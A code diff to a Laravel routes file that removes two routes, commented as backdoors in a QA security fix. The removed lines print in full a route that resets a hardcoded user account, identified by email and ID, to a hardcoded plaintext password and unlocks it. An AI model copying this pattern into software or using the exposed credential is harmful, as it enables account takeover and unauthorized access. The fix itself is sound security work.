@@ -29,9 +29,7 @@ require __DIR__ . '/auth.php';
 require __DIR__ . '/customer.php';
 require __DIR__ . '/tenant.php';
 
-Route::get('/public-fix-user', function() {
-    return redirect()->route('login');
-});
+// SECURITY (QA fix): '/public-fix-user' backdoor route removed.
 
 // Redesign Preview Routes
 // Route::get('/preview-reset', [AccountController::class, 'previewReset']); // Commented out if not used
@@ -91,21 +89,9 @@ Route::middleware('auth:web')->group(function () {
   });
 
   Route::prefix('orders/')->name('orders.')->group(function () {
-    Route::get('/fix-user', function() {
-    $u = \App\Models\User::where('email', 'ppc5.rustx@gmail.com')->first();
-    if (!$u) {
-        $u = \App\Models\User::find(530);
-    }
-    if ($u) {
-        $u->password = \Hash::make('Vane@8840');
-        $u->is_locked = 0;
-        $u->login_attempts = 0;
-        $u->status = 'active';
-        $u->save();
-        return "User {$u->id} ({$u->email}) reset successfully to Vane@8840.";
-    }
-    return "User not found.";
-});
+    // SECURITY (QA fix): '/orders/fix-user' backdoor removed. It reset a
+    // hardcoded account to a hardcoded password for ANY authenticated user.
+    // ACTION REQUIRED: rotate the password of user 530 / ppc5.rustx@gmail.com.
 
 Route::get('/', [DashboardController::class, 'index'])->name('home');
     Route::get('indexAjax', [OrderController::class, 'indexAjax'])->name('indexAjax');
